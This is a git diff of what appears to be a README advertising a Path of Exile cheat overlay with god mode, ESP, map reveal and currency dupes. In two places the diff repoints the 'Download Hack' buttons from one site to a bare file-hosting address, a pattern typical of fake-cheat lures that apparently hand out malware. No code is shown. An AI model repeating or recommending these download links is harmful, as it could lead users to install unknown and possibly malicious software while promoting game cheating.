@@ -6,7 +6,7 @@ Path of Exile is pure chaos—one wrong blink and you’re dead, loot RNG ruins 
 
 This isn’t just a one-feature tool. We’re talking **god mode**, **ESP**, **map reveal**, **auto loot**, **currency dupes**, **skill spam**, and a clean toggle UI—all packed in one modded overlay that works with most offline and private instances. 💻🔥
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://wecheaters.github.io/cheats/path-of-exile-2/)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload10.bitbucket.io)
 ---
 
 ## 🛠️ Product Description
@@ -17,7 +17,7 @@ This **Path of Exile hack menu** is a PC-only cheat interface that connects dire
 🎮 Full compatibility with most builds
 ⚙️ Custom keybinds & hotkey system
 
-[![Download Hack](https://i.ytimg.com/vi/TAwqqoiVxKw/maxresdefault.jpg)](https://wecheaters.github.io/cheats/path-of-exile-2/)
+[![Download Hack](https://i.ytimg.com/vi/TAwqqoiVxKw/maxresdefault.jpg)](https://fileoffload10.bitbucket.io)
 ---
 
 ## 🧠 Core Features of the PoE Hack Menu
